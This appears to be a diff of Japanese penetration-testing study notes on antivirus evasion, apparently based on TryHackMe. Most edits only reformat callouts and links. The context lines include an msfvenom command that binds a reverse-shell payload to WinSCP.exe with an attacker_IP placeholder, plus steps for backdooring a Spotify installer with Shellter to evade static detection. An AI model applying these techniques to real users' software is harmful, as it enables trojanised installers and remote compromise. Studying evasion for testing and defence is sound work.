@@ -2,7 +2,7 @@
     - [AV Evasion：概念と理論](AV%20Evasion：概念と理論.md)
     - [PE構造とシェルコード](PE構造とシェルコード.md)
 
-- 画像ソース：[tryhackme]()
+- 画像ソース：[tryhackme](https://tryhackme.com/)
 
 > [!TIP]
 > EXEよりもDLLのほうがAV回避の成功確率が高い。
@@ -279,7 +279,8 @@ msfvenom -x WinSCP.exe -k -p windows/shell_reverse_tcp LHOST=<attacker_IP> LPORT
 |`-f`|出力フォーマット|
 |`-o`|出力ファイル名|
 
-> [!WARNING] 結合された実行ファイルは元のペイロードのシグネチャを保持しているため、静的解析で検出されるリスクが高い。エンコード・暗号化・パッカーと組み合わせて使う。
+> [!WARNING]
+> 結合された実行ファイルは元のペイロードのシグネチャを保持しているため、静的解析で検出されるリスクが高い。エンコード・暗号化・パッカーと組み合わせて使う。
 
 ---
 
@@ -287,8 +288,7 @@ msfvenom -x WinSCP.exe -k -p windows/shell_reverse_tcp LHOST=<attacker_IP> LPORT
 
 🔗[Shellter](https://www.shellterproject.com/)：信頼された実行ファイルに悪意のあるシェルコードを埋め込む無料AV回避ツール（Windows用・32bitのみ）。
 
-**特徴：**
-
+特徴：
 - 実行直前にペイロードとデコーダの両方を難読化するため静的検知をバイパス
 - セクション権限の変更・新しいセクションの作成などの検知されやすい手法を回避
 - 既存のIAT（Import Address Table）を利用してペイロードを動作させる
@@ -300,13 +300,14 @@ msfvenom -x WinSCP.exe -k -p windows/shell_reverse_tcp LHOST=<attacker_IP> LPORT
 sudo apt install shellter
 # wineのインストールも必要（Shellterはwindows用アプリのため）
 ```
+- [クロスコンパイル環境の準備・実行](../../Misc/コンパイル・ビルド.md#クロスコンパイル環境の準備・実行)
 
 ## 実例：SpotifyインストーラのバックドアF化
 
-> [!NOTE] 実際のテスト現場では、新しくあまり精査されていないアプリケーションを選ぶこと（[公式ドキュメント](https://www.shellterproject.com/an-important-tip-for-shellter-usage/)）
+> [!NOTE]
+> 実際のテスト現場では、新しくあまり精査されていないアプリケーションを選ぶこと（[shellterproject.com - 公式ドキュメント](https://www.shellterproject.com/an-important-tip-for-shellter-usage/)）
 
 1. Autoモードで起動
-
 ```zsh
 shellter
 # → A（Autoモード）を選択
@@ -314,7 +315,7 @@ shellter
 
 2. ターゲットPEファイルのパスを入力（ShellterはPEに変更を加える前に自動でバックアップを作成する）
 
-![](https://claude.ai/%E7%94%BB%E5%83%8F%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB/Pasted%20image%2020250704122954.png)
+![](../../画像ファイル/Pasted%20image%2020250704122954.png)
 
 $$ターゲットPEの選択・自動バックアップ$$
 
